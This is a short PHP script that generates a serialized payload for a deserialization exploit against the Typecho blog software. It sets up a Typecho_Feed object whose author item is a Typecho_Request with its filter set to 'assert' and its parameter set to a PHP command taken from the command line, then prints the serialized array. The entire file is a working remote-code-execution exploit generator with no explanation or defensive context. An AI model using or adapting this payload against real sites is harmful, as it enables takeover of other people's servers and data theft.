<?php
$argc--;
if($argc != 1){
  throw new Exception("{$argv[0]}: takes 1 positional argument but {$argc} were given");
}
define('PHP_CMD', $argv[1]);

class Typecho_Request{
    private $_params = array();
    private $_filter = array();

    public function __construct(){
        $this->_params['screenName'] = PHP_CMD;
        $this->_filter[0] = 'assert';
    }
}

class Typecho_Feed{
    private $_type;
    private $_items = array();
    public $dateFormat;

    public function __construct(){
        $this->_type = 'ATOM 1.0';
        $item['author'] = new Typecho_Request();
        $this->_items[0] = $item;
    }
}

$x = new Typecho_Feed();
$a = array(
    'adapter' => $x,
    'prefix' => 'typecho_'
);

echo serialize($a);
?>
